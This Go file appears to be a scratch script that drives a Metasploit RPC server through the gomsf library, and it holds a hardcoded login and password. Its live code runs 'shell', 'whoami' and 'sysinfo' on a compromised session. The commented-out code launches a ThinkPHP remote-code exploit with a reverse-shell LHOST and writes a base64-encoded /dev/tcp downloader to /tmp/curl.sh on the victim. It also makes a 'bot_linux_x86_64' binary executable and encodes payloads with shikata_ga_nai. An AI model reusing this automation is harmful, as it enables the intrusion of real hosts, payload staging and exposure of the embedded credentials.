package main

import (
	"encoding/json"
	"fmt"
	"github.com/iami317/gomsf"
)

type ExpInfo struct {
	Id         string   `json:"id"`
	Name       string   `json:"name"`
	VulId      string   `json:"vul_id"`
	VulCode    []string `json:"vul_code"`
	Tags       []string `json:"tags"`
	VulPort    string   `json:"vul_port"`
	CaseId     string   `json:"case_id"`
	ExecMethod int      `json:"exec_method"`
	PlatForm   []string `json:"plat_form"`
	Rank       string   `json:"rank"`
}

func (ei ExpInfo) String() string {
	bb, _ := json.Marshal(ei)
	return string(bb)
}

func main() {
	client, err := gomsf.New("192.168.110.24:55553")
	if err != nil {
		panic(err)
	}

	if err = client.Login("hz-msf", "79KsCyTqPizo0e3apj6M"); err != nil {
		panic(err)
	}
	defer client.Logout()
	client.Session.Write(7, "shell")
	client.Session.Write(7, "whoami")
	fmt.Println(client.Session.Read(7))
	//time.Sleep(time.Second)
	//client.Session.Write(7, "uname -a")
	//fmt.Println(client.Session.Read(7))
	fmt.Println(client.Session.SessionKill(7))
	client.Session.Write(7, "sysinfo")
	fmt.Println(client.Session.Read(7))
	//sessionList, _ := client.Session.List()
	//bb, _ := json.Marshal(sessionList)
	//fmt.Println(string(bb))

	//cd
	//pwd
	//cat /tmp/BSmLMQor
	//getuid
	//sysinfo
	//search -d / -f *.txt
	//upload /tmp/aaa.txt /tmp
	//err = client.Session.Write(7, `execute -f /usr/bin/curl "--version"`)
	//err = client.Session.Write(7, `chmod 777 /tmp/bot_linux_x86_64`)
	//err = client.Session.Write(7, `execute -f echo  -a "11111111111 >> /tmp/aaa.txt"`)
	//fmt.Println(client.Session.Write(7, `ls /etc/`))
	//fmt.Println(client.Session.Read(7))
	//fmt.Println(client.Session.SessionDetach(7))

	//err = client.Session.ShellWrite(7, `whoami\n`)
	//err = client.Session.Write(7, `uname -a`)
	//err = client.Session.Write(7, `echo "hello" >> /tmp/hello.txt`)
	//if err != nil {
	//	fmt.Println("命令执行失败")
	//	return
	//}
	//client.Session.ShellWrite(7, "pwd")

	//time.Sleep(time.Second * 2)
	//s2, err2 := client.Session.ShellRead(7, 0)
	//fmt.Println("s2=>", s2, "err2=>", err2)
	//data, _ := base64.StdEncoding.DecodeString("IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIF9fY3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxcclxcbkhvc3Q6ICR7SE9TVH1cXHJcXG5cXHJcXG4iID4mMwogIHJycj1gZWNobyAiRFFvPSIgfCBiYXNlNjQgLWRgCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkcnJyIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgpfX2N1cmwgJDE=")
	//Rea := strings.NewReader(string(data))
	//br := bufio.NewReader(Rea)
	//for {
	//	l, _, e := br.ReadLine()
	//	if e == io.EOF {
	//		break
	//	}
	//	if strings.Contains(string(l), "\"") {
	//		fmt.Println(string(l))
	//		_ = client.Session.Write(7, fmt.Sprintf(`echo "%v" >> /tmp/curl.sh`, string(l)))
	//	} else {
	//		fmt.Println(string(l))
	//		_ = client.Session.Write(7, fmt.Sprintf(`echo "%v" >> /tmp/curl.sh`, string(l)))
	//	}
	//}

	//if err = client.HealthCheck(); err != nil {
	//	panic(err)
	//}

	//version, err := client.Core.Version()
	//exploits, err := client.Module.Exploits()
	//for _, exploit := range exploits {
	//	fmt.Println(exploit)
	//	continue
	//	expInfo := ExpInfo{}
	//	if len(exploit) > 0 {
	//		moduleInfo, err := client.Module.Info(gomsf.ExploitType, exploit)
	//		if err != nil {
	//			fmt.Println(err)
	//			continue
	//		}
	//		expInfo.Name = moduleInfo.Name
	//		//expInfo.Tags =
	//		expInfo.ExecMethod = 2
	//		expInfo.Rank = moduleInfo.Rank
	//		if len(moduleInfo.Platform) > 0 {
	//			for _, s := range moduleInfo.Platform {
	//				sss := strings.Split(s, "::")
	//				expInfo.PlatForm = append(expInfo.PlatForm, strings.ToLower(sss[len(sss)-1]))
	//			}
	//		}
	//		if len(moduleInfo.References) > 0 {
	//			for _, reference := range moduleInfo.References {
	//				if len(reference) >= 2 && strings.Contains(reference[0], "CVE") {
	//					expInfo.VulCode = append(expInfo.VulCode, fmt.Sprintf("%v-%v", reference[0], reference[1]))
	//				}
	//			}
	//		}
	//		if len(moduleInfo.FilePath) > 0 {
	//			chunks := strings.Split(moduleInfo.FilePath, "/")
	//			//fmt.Println("-------", chunks)
	//			if len(chunks) >= 10 {
	//				//ss := strings.Split(strings.TrimLeft(chunks[9], ".rb"), "_")
	//				//ss := strings.TrimLeft(chunks[9], ".rb")
	//				expInfo.Tags = append(expInfo.Tags, chunks[7])
	//				expInfo.Tags = append(expInfo.Tags, chunks[8])
	//				//expInfo.Tags = append(expInfo.Tags, ss)
	//			}
	//		}
	//		//fmt.Println(moduleInfo.String())
	//		fmt.Println(expInfo.String())
	//		time.Sleep(time.Millisecond * 10)
	//	}
	//}
	//fmt.Println(len(exploits))
	//architectures, err := client.Module.Architectures()
	//platforms, err := client.Module.Platforms()
	//payloads, err := client.Module.Payloads()
	//posts, err := client.Module.Posts()
	//auxiliaries, err := client.Module.Auxiliaries()
	//nops, err := client.Module.Nops()
	//evasions, err := client.Module.Evasions()
	//moduleInfo, err := client.Module.Info(gomsf.PayloadType, "windows/meterpreter/reverse_tcp")
	//encoded, err := client.Module.Encode("AAAA", "x86/shikata_ga_nai", &gomsf.EncodeOptions{
	//	Format: "c",
	//})
	//pluginList, _ := client.Plugins.List()
	//fmt.Println(pluginList)
	//exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
	//err = exploit.Set("RHOSTS", "192.168.100.149")
	//if err != nil {
	//	fmt.Println(err)
	//}
	//exploit.Set("RPORT", "8081")
	//exploit.Set("TARGETURI", "/")
	//exploit.Set("SRVHOST", "0.0.0.0")
	//exploit.Set("SRVPORT", "8080")
	//exploit.Set("LHOST", "192.168.0.199")
	//exploit.Set("LPORT", "4444")
	//options := exploit.OptionsAdvanced()
	//detail := exploit.OptionsDetail()
	//fmt.Println(exploit.Get("RHOSTS"))
	/*
			res, err := client.Module.Execute(gomsf.ExploitType, "unix/webapp/thinkphp_rce", map[string]interface{}{
				"RHOST":   "192.168.100.149",
				"RPORT":   "8081",
				"SRVHOST": "0.0.0.0",
				"SRVPORT": "8080",
				"LHOST":   "192.168.110.33",
				"LPORT":   "4444",
			})
			fmt.Println(res, err)
			if res.JobID > 0 && len(res.UUID) > 0 {
				jobId := strconv.Itoa(int(res.JobID))
				jobRes, _ := client.Jobs.Info(jobId)
				fmt.Println(res.JobID, res.UUID)
				fmt.Println("jobRes", jobRes)
			} else {
				fmt.Println("攻击失败")
				return
			}
			//


		//list, _ := client.Session.List()
		//fmt.Println(list)
		//return

		err = client.Session.Write(7, "screenshot")
		fmt.Println(err)
		time.Sleep(time.Second * 1)
		s, err := client.Session.Read(7)
		fmt.Println(s)
		fmt.Println(err)
	*/
	//fmt.Println(client.Session.Stop(5))
	//fmt.Println(client.Session.Stop(6))
	//list, _ := client.Session.List()
	//fmt.Println(list)
}
